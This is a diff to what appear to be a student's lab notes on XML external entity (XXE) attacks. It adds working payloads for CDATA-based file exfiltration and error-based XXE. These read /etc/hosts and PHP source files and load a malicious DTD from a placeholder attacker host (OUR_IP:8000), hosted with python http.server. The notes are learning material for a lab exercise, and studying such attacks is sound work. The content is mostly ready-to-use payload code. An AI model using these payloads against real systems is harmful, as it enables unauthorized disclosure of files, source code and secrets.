@@ -1,5 +1,4 @@
 ___
-
 # Local File Disclosure
 
 ```xml
@@ -36,4 +35,55 @@ sudo python3 -m http.server 80
 
 Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer. 
 
-# Advanced ##Exfiltration with CDATA
+# Advanced Exfiltration with CDATA
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
+```
+
+This will not work, since XML prevents joining internal and external entities.
+
+```bash
+echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+```
+
+```bash
+echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+python3 -m http.server 8000
+```
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+...
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+```
+
+# Error Based XXE
+
+First, we will host a DTD file that contains the following payload:
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+
+```xml
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+```
+
+This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. `"file:///var/www/html/submitDetails.php"`). However, `this method is not as reliable as the previous method for reading source files`, as it may have length limitations, and certain special characters may still break it.
+
